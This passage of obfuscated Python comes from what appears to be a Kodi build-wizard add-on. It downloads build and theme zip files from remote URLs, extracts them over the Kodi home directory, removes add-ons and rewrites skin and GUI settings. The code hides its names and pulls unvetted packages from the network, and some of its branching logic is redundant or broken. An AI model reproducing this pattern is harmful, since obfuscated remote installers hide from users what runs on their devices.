			O00OOO0OO0OO000O0 .close ()#line:3883
			O0OOO0OO0O000O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3884
			OO00OO00OOO0O0OOO =re .compile (O0OOO0OO0O000O0O0 ).findall (OO00O00O000OO000O )[0 ]#line:3885
			O00OOO0OO0OO000O0 =open (O00OO0O0OOO00OO0O ,'w')#line:3886
			O00OOO0OO0OO000O0 .write (OO00O00O000OO000O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%OO00OO00OOO0O0OOO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3887
			O00OOO0OO0OO000O0 .close ()#line:3888
		except :#line:3889
				pass #line:3890
		wiz .kodi17Fix ()#line:3891
		O00OO0O0OOO00OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3892
		try :#line:3893
			O00OOO0OO0OO000O0 =open (O00OO0O0OOO00OO0O ,'r')#line:3894
			OO00O00O000OO000O =O00OOO0OO0OO000O0 .read ()#line:3895
			O00OOO0OO0OO000O0 .close ()#line:3896
			O0OOO0OO0O000O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3897
			OO00OO00OOO0O0OOO =re .compile (O0OOO0OO0O000O0O0 ).findall (OO00O00O000OO000O )[0 ]#line:3898
			O00OOO0OO0OO000O0 =open (O00OO0O0OOO00OO0O ,'w')#line:3899
			O00OOO0OO0OO000O0 .write (OO00O00O000OO000O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%OO00OO00OOO0O0OOO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3900
			O00OOO0OO0OO000O0 .close ()#line:3901
		except :#line:3902
				pass #line:3903
		swapSkins ('skin.Premium.mod')#line:3904
def buildWizard (OOO0OO00O0O000O00 ,OO00OOOO00000O000 ,theme =None ,over =False ):#line:3907
	if over ==False :#line:3908
		OOO0O00O0O0O0OO00 =wiz .checkBuild (OOO0OO00O0O000O00 ,'url')#line:3909
		if OOO0O00O0O0O0OO00 ==False :#line:3911
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:3916
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3917
			return #line:3918
		O0OOO00O0O0OO0000 =wiz .workingURL (OOO0O00O0O0O0OO00 )#line:3919
		if O0OOO00O0O0OO0000 ==False :#line:3920
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O0OOO00O0O0OO0000 ))#line:3921
			return #line:3922
	if OO00OOOO00000O000 =='gui':#line:3923
		if OOO0OO00O0O000O00 ==BUILDNAME :#line:3924
			if over ==True :O00OOOO0000O00O0O =1 #line:3925
			else :O00OOOO0000O00O0O =1 #line:3926
		else :#line:3927
			O00OOOO0000O00O0O =1 #line:3928
		if O00OOOO0000O00O0O :#line:3929
			remove_addons ()#line:3930
			remove_addons2 ()#line:3931
			OO00OOO00O00OO0OO =wiz .checkBuild (OOO0OO00O0O000O00 ,'gui')#line:3932
			O00O0O00O0O0000OO =OOO0OO00O0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3933
			if not wiz .workingURL (OO00OOO00O00OO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3934
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3935
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 ),'','אנא המתן')#line:3936
			O00O00O000000OO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0O00O0O0000OO )#line:3937
			try :os .remove (O00O00O000000OO0O )#line:3938
			except :pass #line:3939
			logging .warning (OO00OOO00O00OO0OO )#line:3940
			if 'google'in OO00OOO00O00OO0OO :#line:3941
			   O000OOO0OO0O00OO0 =googledrive_download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP ,wiz .checkBuild (OOO0OO00O0O000O00 ,'filesize'))#line:3942
			else :#line:3945
			  downloader .download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP )#line:3946
			xbmc .sleep (100 )#line:3947
			OOOOO0OO00000O0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 )#line:3948
			DP .update (0 ,OOOOO0OO00000O0O0 ,'','אנא המתן')#line:3949
			extract .all (O00O00O000000OO0O ,HOME ,DP ,title =OOOOO0OO00000O0O0 )#line:3950
			DP .close ()#line:3951
			wiz .defaultSkin ()#line:3952
			wiz .lookandFeelData ('save')#line:3953
			wiz .kodi17Fix ()#line:3954
			if KODIV >=18 :#line:3955
				skindialogsettind18 ()#line:3956
			xbmc .executebuiltin ("ReloadSkin()")#line:3957
			if INSTALLMETHOD ==1 :OOOOO00OO0O00OO00 =1 #line:3958
			elif INSTALLMETHOD ==2 :OOOOO00OO0O00OO00 =0 #line:3959
			else :DP .close ()#line:3960
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3961
			update_Votes ()#line:3962
			indicatorfastupdate ()#line:3963
		else :#line:3965
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3966
	if OO00OOOO00000O000 =='gui2':#line:3967
		if OOO0OO00O0O000O00 ==BUILDNAME :#line:3968
			if over ==True :O00OOOO0000O00O0O =1 #line:3969
			else :O00OOOO0000O00O0O =1 #line:3970
		else :#line:3971
			O00OOOO0000O00O0O =1 #line:3972
		if O00OOOO0000O00O0O :#line:3973
			remove_addons ()#line:3974
			remove_addons2 ()#line:3975
			OO00OOO00O00OO0OO =wiz .checkBuild (OOO0OO00O0O000O00 ,'gui')#line:3976
			O00O0O00O0O0000OO =OOO0OO00O0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3977
			if not wiz .workingURL (OO00OOO00O00OO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3978
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3979
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 ),'','אנא המתן')#line:3980
			O00O00O000000OO0O =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00O0O00O0O0000OO )#line:3981
			try :os .remove (O00O00O000000OO0O )#line:3982
			except :pass #line:3983
			logging .warning (OO00OOO00O00OO0OO )#line:3984
			if 'google'in OO00OOO00O00OO0OO :#line:3985
			   O000OOO0OO0O00OO0 =googledrive_download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP ,wiz .checkBuild (OOO0OO00O0O000O00 ,'filesize'))#line:3986
			else :#line:3989
			  downloader .download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP )#line:3990
			xbmc .sleep (100 )#line:3991
			OOOOO0OO00000O0O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 )#line:3992
			DP .update (0 ,OOOOO0OO00000O0O0 ,'','אנא המתן')#line:3993
			extract .all (O00O00O000000OO0O ,HOME ,DP ,title =OOOOO0OO00000O0O0 )#line:3994
			DP .close ()#line:3995
			wiz .defaultSkin ()#line:3996
			wiz .lookandFeelData ('save')#line:3997
			if INSTALLMETHOD ==1 :OOOOO00OO0O00OO00 =1 #line:4000
			elif INSTALLMETHOD ==2 :OOOOO00OO0O00OO00 =0 #line:4001
			else :DP .close ()#line:4002
		else :#line:4004
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:4005
	elif OO00OOOO00000O000 =='fresh':#line:4006
		freshStart (OOO0OO00O0O000O00 )#line:4007
	elif OO00OOOO00000O000 =='normal':#line:4008
		if url =='normal':#line:4009
			if KEEPTRAKT =='true':#line:4010
				traktit .autoUpdate ('all')#line:4011
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4012
			if KEEPREAL =='true':#line:4013
				debridit .autoUpdate ('all')#line:4014
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4015
			if KEEPLOGIN =='true':#line:4016
				loginit .autoUpdate ('all')#line:4017
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4018
		O0O0O0000O0000OOO =int (KODIV );O0OO00O0000000OOO =int (float (wiz .checkBuild (OOO0OO00O0O000O00 ,'kodi')))#line:4019
		if not O0O0O0000O0000OOO ==O0OO00O0000000OOO :#line:4020
			if O0O0O0000O0000OOO ==16 and O0OO00O0000000OOO <=15 :O00O00O000000O0OO =False #line:4021
			else :O00O00O000000O0OO =True #line:4022
		else :O00O00O000000O0OO =False #line:4023
		if O00O00O000000O0OO ==True :#line:4024
			O00000OO0000O000O =1 #line:4025
		else :#line:4026
			if not over ==False :O00000OO0000O000O =1 #line:4027
			else :O00000OO0000O000O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4028
		if O00000OO0000O000O :#line:4029
			wiz .clearS ('build')#line:4030
			OO00OOO00O00OO0OO =wiz .checkBuild (OOO0OO00O0O000O00 ,'url')#line:4031
			O00O0O00O0O0000OO =OOO0OO00O0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4032
			if not wiz .workingURL (OO00OOO00O00OO0OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:4033
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4034
			DP .create (ADDONTITLE ,'[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR][B]מוריד[/B]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 ,wiz .checkBuild (OOO0OO00O0O000O00 ,'version')),'','אנא המתן')#line:4035
			O00O00O000000OO0O =os .path .join (PACKAGES ,'%s.zip'%O00O0O00O0O0000OO )#line:4036
			try :os .remove (O00O00O000000OO0O )#line:4037
			except :pass #line:4038
			logging .warning (OO00OOO00O00OO0OO )#line:4039
			if 'google'in OO00OOO00O00OO0OO :#line:4040
			   O000OOO0OO0O00OO0 =googledrive_download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP ,wiz .checkBuild (OOO0OO00O0O000O00 ,'filesize'))#line:4041
			else :#line:4044
			  downloader .download (OO00OOO00O00OO0OO ,O00O00O000000OO0O ,DP )#line:4045
			xbmc .sleep (1000 )#line:4046
			OOOOO0OO00000O0O0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 ,wiz .checkBuild (OOO0OO00O0O000O00 ,'version'))#line:4047
			DP .update (0 ,OOOOO0OO00000O0O0 ,'','אנא המתן...')#line:4048
			OOO0O000000OOOO00 ,O0OOOO0OO000O0000 ,O0O0OO0O000OO0OO0 =extract .all (O00O00O000000OO0O ,HOME ,DP ,title =OOOOO0OO00000O0O0 )#line:4049
			if int (float (OOO0O000000OOOO00 ))>0 :#line:4050
				try :#line:4051
					wiz .fixmetas ()#line:4052
				except :pass #line:4053
				wiz .lookandFeelData ('save')#line:4054
				wiz .defaultSkin ()#line:4055
				wiz .setS ('buildname',OOO0OO00O0O000O00 )#line:4057
				wiz .setS ('buildversion',wiz .checkBuild (OOO0OO00O0O000O00 ,'version'))#line:4058
				wiz .setS ('buildtheme','')#line:4059
				wiz .setS ('latestversion',wiz .checkBuild (OOO0OO00O0O000O00 ,'version'))#line:4060
				wiz .setS ('lastbuildcheck',str (NEXTCHECK ))#line:4061
				wiz .setS ('installed','true')#line:4062
				wiz .setS ('extract',str (OOO0O000000OOOO00 ))#line:4063
				wiz .setS ('errors',str (O0OOOO0OO000O0000 ))#line:4064
				wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OOO0O000000OOOO00 ,O0OOOO0OO000O0000 ))#line:4065
				fastupdatefirstbuild (NOTEID )#line:4066
				wiz .kodi17Fix ()#line:4067
				skin_homeselect ()#line:4068
				skin_lower ()#line:4069
				rdbuildinstall ()#line:4070
				try :gaiaserenaddon ()#line:4071
				except :pass #line:4072
				adults18 ()#line:4073
				skinfix18 ()#line:4074
				try :os .remove (O00O00O000000OO0O )#line:4076
				except :pass #line:4077
				O000O0OO0O0OOOO00 =(ADDON .getSetting ("auto_rd"))#line:4078
				if O000O0OO0O0OOOO00 =='true':#line:4079
					try :#line:4080
						setautorealdebrid ()#line:4081
					except :pass #line:4082
				try :#line:4083
					autotrakt ()#line:4084
				except :pass #line:4085
				OO000000000O000O0 =(ADDON .getSetting ("imdb_on"))#line:4086
				if OO000000000O000O0 =='true':#line:4087
					imdb_synck ()#line:4088
				iptvset ()#line:4089
				DP .close ()#line:4097
				O0O0OOOO0O00OO0O0 =wiz .themeCount (OOO0OO00O0O000O00 )#line:4098
				builde_Votes ()#line:4099
				indicator ()#line:4100
				if not O0O0OOOO0O00OO0O0 ==False :#line:4101
					buildWizard (OOO0OO00O0O000O00 ,'theme')#line:4102
				if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4103
				if INSTALLMETHOD ==1 :OOOOO00OO0O00OO00 =1 #line:4104
				elif INSTALLMETHOD ==2 :OOOOO00OO0O00OO00 =0 #line:4105
				else :resetkodi ()#line:4106
				if OOOOO00OO0O00OO00 ==1 :wiz .reloadFix ()#line:4108
				else :wiz .killxbmc (True )#line:4109
			else :#line:4110
				if isinstance (O0OOOO0OO000O0000 ,unicode ):#line:4111
					O0O0OO0O000OO0OO0 =O0O0OO0O000OO0OO0 .encode ('utf-8')#line:4112
				OO0O0OO000OO0OO0O =open (O00O00O000000OO0O ,'r')#line:4113
				O0OO0OOO0O0O00000 =OO0O0OO000OO0OO0O .read ()#line:4114
				O00OO0OO0OOOOO0OO =''#line:4115
				for OO00O0OOO0000O0O0 in O000OOO0OO0O00OO0 :#line:4116
				  O00OO0OO0OOOOO0OO ='key: '+O00OO0OO0OOOOO0OO +'\n'+OO00O0OOO0000O0O0 #line:4117
				wiz .TextBox ("%s: בעיה בהתקנת הבילד"%ADDONTITLE ,O0O0OO0O000OO0OO0 +'לפתרון הבעיה יש לשנות את התאריך במכשיר ליום אחד קודם.'+O00OO0OO0OOOOO0OO )#line:4118
		else :#line:4119
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנת הבילד: מבוטלת![/COLOR]'%COLOR2 )#line:4120
	elif OO00OOOO00000O000 =='theme':#line:4121
		if theme ==None :#line:4122
			O0O0OOOO0O00OO0O0 =wiz .checkBuild (OOO0OO00O0O000O00 ,'theme')#line:4123
			O0OOOO00O0OOO0000 =[]#line:4124
			if not O0O0OOOO0O00OO0O0 =='http://'and wiz .workingURL (O0O0OOOO0O00OO0O0 )==True :#line:4125
				O0OOOO00O0OOO0000 =wiz .themeCount (OOO0OO00O0O000O00 ,False )#line:4126
				if len (O0OOOO00O0OOO0000 )>0 :#line:4127
					if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]The Build [COLOR %s]%s[/COLOR] comes with [COLOR %s]%s[/COLOR] different themes"%(COLOR2 ,COLOR1 ,OOO0OO00O0O000O00 ,COLOR1 ,len (O0OOOO00O0OOO0000 )),"Would you like to install one now?[/COLOR]",yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]"):#line:4128
						wiz .log ("Theme List: %s "%str (O0OOOO00O0OOO0000 ))#line:4129
						O000O0O00OO00OO00 =DIALOG .select (ADDONTITLE ,O0OOOO00O0OOO0000 )#line:4130
						wiz .log ("Theme install selected: %s"%O000O0O00OO00OO00 )#line:4131
						if not O000O0O00OO00OO00 ==-1 :theme =O0OOOO00O0OOO0000 [O000O0O00OO00OO00 ];OOO0O00O0O00O0O0O =True #line:4132
						else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4133
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:4134
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:4135
		else :OOO0O00O0O00O0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,OOO0OO00O0O000O00 ,wiz .checkBuild (OOO0OO00O0O000O00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:4136
		if OOO0O00O0O00O0O0O :#line:4137
			O0O000OO00O000O0O =wiz .checkTheme (OOO0OO00O0O000O00 ,theme ,'url')#line:4138
			O00O0O00O0O0000OO =OOO0OO00O0O000O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4139
			if not wiz .workingURL (O0O000OO00O000O0O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:4140
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4141
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:4142
			O00O00O000000OO0O =os .path .join (PACKAGES ,'%s.zip'%O00O0O00O0O0000OO )#line:4143
			try :os .remove (O00O00O000000OO0O )#line:4144
			except :pass #line:4145
			downloader .download (O0O000OO00O000O0O ,O00O00O000000OO0O ,DP )#line:4146
			xbmc .sleep (1000 )#line:4147
			DP .update (0 ,"","Installing %s "%OOO0OO00O0O000O00 )#line:4148
			OOOOO0OO0000OOOO0 =False #line:4149
			if url not in ["fresh","normal"]:#line:4150
				OOOOO0OO0000OOOO0 =testTheme (O00O00O000000OO0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4151
				O00O0O00O0OO0OO00 =testGui (O00O00O000000OO0O )if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']else False #line:4152
				if OOOOO0OO0000OOOO0 ==True :#line:4153
					wiz .lookandFeelData ('save')#line:4154
					OOO0OOO00OOO00O0O ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4155
					OOO0O00O0OO00000O =xbmc .getSkinDir ()#line:4156
					skinSwitch .swapSkins (OOO0OOO00OOO00O0O )#line:4158
					O00OO0000000OO0O0 =0 #line:4159
					xbmc .sleep (1000 )#line:4160
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0000000OO0O0 <150 :#line:4161
						O00OO0000000OO0O0 +=1 #line:4162
						xbmc .sleep (1000 )#line:4163
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4164
						wiz .ebi ('SendClick(11)')#line:4165
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4166
					xbmc .sleep (1000 )#line:4167
			OOOOO0OO00000O0O0 ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:4168
			DP .update (0 ,OOOOO0OO00000O0O0 ,'','אנא המתן')#line:4169
			OOO0O000000OOOO00 ,O0OOOO0OO000O0000 ,O0O0OO0O000OO0OO0 =extract .all (O00O00O000000OO0O ,HOME ,DP ,title =OOOOO0OO00000O0O0 )#line:4170
			wiz .setS ('buildtheme',theme )#line:4171
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(OOO0O000000OOOO00 ,O0OOOO0OO000O0000 ))#line:4172
			DP .close ()#line:4173
			if url not in ["fresh","normal"]:#line:4174
				wiz .forceUpdate ()#line:4175
				if KODIV >=17 :wiz .kodi17Fix ()#line:4176
				if O00O0O00O0OO0OO00 ==True :#line:4177
					wiz .lookandFeelData ('save')#line:4178
					wiz .defaultSkin ()#line:4179
					OOO0O00O0OO00000O =wiz .getS ('defaultskin')#line:4180
					skinSwitch .swapSkins (OOO0O00O0OO00000O )#line:4181
					O00OO0000000OO0O0 =0 #line:4182
					xbmc .sleep (1000 )#line:4183
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0000000OO0O0 <150 :#line:4184
						O00OO0000000OO0O0 +=1 #line:4185
						xbmc .sleep (1000 )#line:4186
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4188
						wiz .ebi ('SendClick(11)')#line:4189
					wiz .lookandFeelData ('restore')#line:4190
				elif OOOOO0OO0000OOOO0 ==True :#line:4191
					skinSwitch .swapSkins (OOO0O00O0OO00000O )#line:4192
					O00OO0000000OO0O0 =0 #line:4193
					xbmc .sleep (1000 )#line:4194
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OO0000000OO0O0 <150 :#line:4195
						O00OO0000000OO0O0 +=1 #line:4196
						xbmc .sleep (1000 )#line:4197
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4199
						wiz .ebi ('SendClick(11)')#line:4200
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:4201
					wiz .lookandFeelData ('restore')#line:4202
				else :#line:4203
					wiz .ebi ("ReloadSkin()")#line:4204
					xbmc .sleep (1000 )#line:4205
					wiz .ebi ("Container.Refresh")#line:4206
		else :#line:4207
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:4208
def skin_homeselect ():#line:4212
	try :#line:4214
		O0OO0OO0OO00OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4215
		O0000OOO0OO0OO000 =open (O0OO0OO0OO00OO0O0 ,'r')#line:4217
		O0O0000OO0OO0O000 =O0000OOO0OO0OO000 .read ()#line:4218
		O0000OOO0OO0OO000 .close ()#line:4219
		OO00O0OOOOO0O00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:4220
		O0OOOOOO0000OOO00 =re .compile (OO00O0OOOOO0O00OO ).findall (O0O0000OO0OO0O000 )[0 ]#line:4221
		O0000OOO0OO0OO000 =open (O0OO0OO0OO00OO0O0 ,'w')#line:4222
		O0000OOO0OO0OO000 .write (O0O0000OO0OO0O000 .replace ('<setting id="HomeS" type="string%s/setting>'%O0OOOOOO0000OOO00 ,'<setting id="HomeS" type="string"></setting>'))#line:4223
		O0000OOO0OO0OO000 .close ()#line:4224
	except :#line:4225
		pass #line:4226
def skin_lower ():#line:4229
	O0OOO0OO0O00O0000 =(ADDON .getSetting ("lower"))#line:4230
	if O0OOO0OO0O00O0000 =='true':#line:4231
		try :#line:4234
			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4235
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4237
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4238
			OOOO00OO0O00000O0 .close ()#line:4239
			OO000O0O0O0OOO00O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:4240
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4241
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4242
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="none_widget" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="none_widget" type="bool">true</setting>'))#line:4243
			OOOO00OO0O00000O0 .close ()#line:4244
			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4246
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4248
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4249
			OOOO00OO0O00000O0 .close ()#line:4250
			OO000O0O0O0OOO00O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:4251
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4252
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4253
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:4254
			OOOO00OO0O00000O0 .close ()#line:4255
			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4257
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4259
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4260
			OOOO00OO0O00000O0 .close ()#line:4261
			OO000O0O0O0OOO00O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:4262
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4263
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4264
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4265
			OOOO00OO0O00000O0 .close ()#line:4266
			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4270
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4272
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4273
			OOOO00OO0O00000O0 .close ()#line:4274
			OO000O0O0O0OOO00O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4275
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4276
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4277
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4278
			OOOO00OO0O00000O0 .close ()#line:4279
			O000O00OO000OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4283
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'r')#line:4285
			OO00O0O000000000O =OOOO00OO0O00000O0 .read ()#line:4286
			OOOO00OO0O00000O0 .close ()#line:4287
			OO000O0O0O0OOO00O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4288
			OO00OOOOO0OOO0000 =re .compile (OO000O0O0O0OOO00O ).findall (OO00O0O000000000O )[0 ]#line:4289
			OOOO00OO0O00000O0 =open (O000O00OO000OOOOO ,'w')#line:4290
			OOOO00OO0O00000O0 .write (OO00O0O000000000O .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO00OOOOO0OOO0000 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4291
			OOOO00OO0O00000O0 .close ()#line:4292
